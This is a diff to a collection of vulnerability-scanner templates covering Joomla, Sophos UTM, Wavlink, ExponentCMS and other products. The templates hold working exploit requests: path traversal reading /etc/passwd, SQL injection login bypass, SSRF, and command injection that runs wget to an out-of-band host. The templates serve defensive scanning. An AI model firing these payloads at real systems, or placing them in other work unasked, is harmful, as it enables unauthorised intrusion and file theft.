@@ -864,6 +864,40 @@
       ]
     },
     {
+      "id": "CVE-2010-1657",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the SmartSite (com_smartsite) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component SmartSite 1.0.0 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12428\n- https://www.cvedetails.com/cve/CVE-2010-1657\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_smartsite&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1722",
       "info": {
         "author": "daffainfo",
@@ -1063,6 +1097,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2033",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla Percha Categories Tree 0.6 - Local File Inclusion",
+        "reference": "- https://packetstormsecurity.com/files/89654/Joomla-Percha-Categories-Tree-0.6-Local-File-Inclusion.html\n- https://www.cvedetails.com/cve/CVE-2010-2033\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -13074,7 +13142,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /rest/issueNav/1/issueTable HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36\nConnection: Close\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nX-Atlassian-Token: no-check\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{'jql':'project in projectsLeadByUser(\"{{randstr}}\")'}\n"
+            "POST /rest/issueNav/1/issueTable HTTP/1.1\nHost: {{Hostname}}\nConnection: Close\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nX-Atlassian-Token: no-check\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{'jql':'project in projectsLeadByUser(\"{{randstr}}\")'}\n"
           ]
         }
       ]
@@ -14202,7 +14270,7 @@
             }
           ],
           "raw": [
-            "POST /cgi-bin/login.cgi HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://{{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nConnection: close\n\nnewUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2F{{interactsh-url}}%3B%60%3B%23&password=asd&lang_select=en\n"
+            "POST /cgi-bin/login.cgi HTTP/1.1\nHost: {{Hostname}}\nOrigin: http://{{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\nnewUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2F{{interactsh-url}}%3B%60%3B%23&password=asd&lang_select=en\n"
           ]
         }
       ]
@@ -16207,6 +16275,33 @@
       ]
     },
     {
+      "id": "CVE-2020-25223",
+      "info": {
+        "author": "gy741",
+        "description": "A remote code execution vulnerability exists in the WebAdmin of Sophos SG UTM before v9.705 MR5, v9.607 MR7, and v9.511 MR11",
+        "name": "Sophos UTM - Preauth RCE",
+        "reference": "- https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,sophos,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /var HTTP/1.1\nHost: {{Hostname}}\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.5.1.1\nContent-type: application/json; charset=UTF-8\nOrigin: {{BaseURL}}\nConnection: close\nReferer: {{BaseURL}}\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n{\"objs\": [{\"FID\": \"init\"}], \"SID\": \"|wget http://{{interactsh-url}}|\", \"browser\": \"gecko_linux\", \"backend_version\": -1, \"loc\": \"\", \"_cookie\": null, \"wdebug\": 0, \"RID\": \"1629210675639_0.5000855117488202\", \"current_uuid\": \"\", \"ipv6\": true}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-25495",
       "info": {
         "author": "0x_Akoko",
@@ -17734,7 +17829,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /dfsms/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nConnection: close\nContent-Length: 66\n\nusername=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n"
+            "POST /dfsms/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 66\n\nusername=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n"
           ]
         }
       ]
@@ -21012,7 +21107,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n"
+            "GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n"
           ]
         }
       ]
@@ -21447,7 +21542,7 @@
         "name": "Exchange Server SSRF Vulnerability",
         "reference": "- https://proxylogon.com/#timeline\n- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse\n- https://www.shodan.io/search?query=vuln%3ACVE-2021-26855\n- https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09\n",
         "severity": "critical",
-        "tags": "cve,cve2021,ssrf,rce,exchange,oob"
+        "tags": "cve,cve2021,ssrf,rce,exchange,oob,microsoft"
       },
       "requests": [
         {
@@ -21832,8 +21927,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /log_download.cgi?type=../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n",
-            "GET /log_download.cgi?type=../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAuthorization: Basic YWRtaW46YWRtaW4=\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n"
+            "GET /log_download.cgi?type=../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\n",
+            "GET /log_download.cgi?type=../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46YWRtaW4=\n"
           ]
         }
       ]
@@ -23666,6 +23761,45 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-38751",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "A HTTP Host header attack exists in ExponentCMS 2.6\nand below in /exponent_constants.php. A modified HTTP\nheader can change links on the webpage to an arbitrary value,\nleading to a possible attack vector for MITM.\n",
+        "name": "ExponentCMS <= 2.6 Host Header Injection",
+        "reference": "- https://github.com/exponentcms/exponent-cms/issues/1544\n- https://github.com/exponentcms/exponent-cms/blob/a9fa9358c5e8dc2ce7ad61d7d5bea38505b8515c/exponent_constants.php#L56-L64\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,exponentcms"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Host": "{{randstr}}.tld"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "(EXPONENT\\.(?:(?:J(?:QUERY|S)_UR|URL_FUL)|YUI2_UR)L=\")?https?://{{randstr}}\\.tld"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/",
+            "{{BaseURL}}/login/showlogin"
           ]
         }
       ]
